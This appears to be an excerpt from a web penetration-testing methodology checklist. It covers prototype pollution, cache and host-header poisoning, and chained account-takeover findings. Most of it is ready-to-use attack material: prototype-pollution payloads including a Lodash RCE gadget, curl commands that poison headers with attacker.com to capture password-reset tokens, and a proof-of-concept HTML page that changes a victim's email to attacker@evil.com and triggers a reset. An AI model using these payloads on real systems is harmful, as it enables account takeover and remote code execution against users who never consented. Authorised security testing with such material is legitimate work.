3Prototype Pollution

Detect prototype pollution// Try in URL params, JSON bodies, or anywhere user JSON is merged:
?__proto__[polluted]=yes
?constructor[prototype][polluted]=yes
{"__proto__":{"polluted":"yes"}}
{"constructor":{"prototype":{"polluted":"yes"}}}

// Then in browser console:
console.log({}.polluted);   // "yes" → vulnerable
Common gadgets (server-side Node)// 1. Express body-parser default options
{"__proto__":{"shell":"/bin/bash","argv0":"/bin/bash"}}

// 2. Lodash _.template (RCE on render — uses U+2028 line separators)
{"__proto__":{"sourceURL":"\u2028\u2028return process.mainModule.require('child_process').execSync('id').toString()"}}

// 3. Override common option defaults
{"__proto__":{"isAdmin":true,"role":"admin"}}
  • Find pollution sinks: Object.assign, lodash _.merge, jQuery.extend(true, ...), Object.create
  • Inject __proto__ via JSON: {"__proto__":{"polluted":true}} — check {}.polluted in console
  • Try constructor.prototype chain too
  • Identify a gadget: innerHTML, src, srcdoc, action, data, server-side template default
  • Server-side proto-pollution → RCE (Node.js apps, look for child_process.exec defaults)
  • Burp DOM Invader Prototype Pollution scan

5Host Header / Cache

Cache-poisoning probe (manual unkeyed-header sweep)TARGET=https://example.com/

for h in X-Forwarded-Host X-Forwarded-Scheme X-Forwarded-Proto \
         X-Forwarded-Server X-HTTP-Method-Override X-Original-URL \
         X-Rewrite-URL X-Forwarded-Port; do
  echo "=== $h ==="
  curl -sk $TARGET -H "$h: attacker.com" -o /tmp/a.html
  curl -sk $TARGET                          -o /tmp/b.html
  diff /tmp/a.html /tmp/b.html | head -5
done

# Or use the Param Miner Burp extension's "Guess headers" feature.
Host-header password-reset poison (the classic)curl -sk -X POST https://example.com/forgot \
  -H "Host: attacker.com" \
  -d "email=victim@example.com"
# When victim clicks the reset link, it goes to attacker.com — exfil the token.
  • Host-header poisoning on password-reset email link
  • Try X-Forwarded-Host, X-Original-Host, X-Forwarded-Server alternatives
  • Find unkeyed inputs: Param Miner / manual X-Forwarded-Scheme, X-Forwarded-Host, X-Original-URL
  • Confirm cacheable: Age: header, X-Cache: HIT, Cache-Control: public
  • Poison cache with XSS / open redirect via unkeyed header — affects all subsequent users
  • Cache deception: /profile/x.css — does it cache the dynamic profile response?

6Chained Findings

The whole point of Day 5 — combined impact > sum of parts. A 9.8-CVSS chain is one finding, not three.

Chained ATO POC HTML (skeleton)<!-- chain.html (host on attacker.com) -->
<!DOCTYPE html><html><body>
<h1>You won! Click below to claim.</h1>
<script>
// Step 1 — XSS in the target (e.g., after stored XSS fires there, this
// runs in the target's origin):
fetch('https://example.com/api/me/email', {
  method: 'PUT',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com'})
});

// Step 2 — request password reset to the new email
fetch('https://example.com/api/forgot-password', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com'})
});
</script>
</body></html>
  • Try XSS + CSRF chain (XSS triggers state-changing request)
  • Try SSRF + RCE chain (metadata IAM → S3 / Lambda / EC2 → RCE)
  • Try IDOR + role-escalation (modify another user's role to admin)
  • Try Prototype Pollution + gadget (PP makes a sink reachable)
  • Try Host-header + password-reset (poison link → ATO any user)

7Reproducibility Verification

Every finding must be reproducible from a clean state, otherwise it doesn't ship.

  • Fresh browser profile (or incognito) — clear cookies, localStorage, cache
  • Re-run every Day-4 POC from scratch — does it still fire?
  • Re-run every Day-5 chain end-to-end
  • Edge cases tested: different browsers, different roles, different tenants
  • Fresh screenshots captured for the report
